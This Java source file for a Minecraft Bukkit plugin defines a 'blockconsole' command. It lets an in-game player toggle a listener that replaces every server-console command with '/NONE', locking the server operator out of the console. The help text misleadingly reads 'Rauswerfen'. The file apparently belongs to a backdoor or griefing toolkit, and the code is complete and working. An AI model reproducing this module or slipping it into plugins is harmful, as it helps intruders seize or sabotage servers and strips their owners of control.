package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

public class Command_BlockConsole extends CommandBase implements Listener {

    private boolean block = false;

    public Command_BlockConsole() {
        super("blockconsole", ChatColor.GRAY + "Rauswerfen", Category.OTHER);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        if (!this.block) {
            this.block = true;
            p.sendMessage(Start.INSTANCE.chatPrefix + "Konsole blockiert!");
        } else {
            this.block = false;
            p.sendMessage(Start.INSTANCE.chatPrefix + "Konsole nicht mehr blockiert!");
        }
    }

    @EventHandler
    public void onConsoleCommand(ServerCommandEvent e) {
        if (this.block) {
            e.setCommand("/NONE");
        }
    }

}
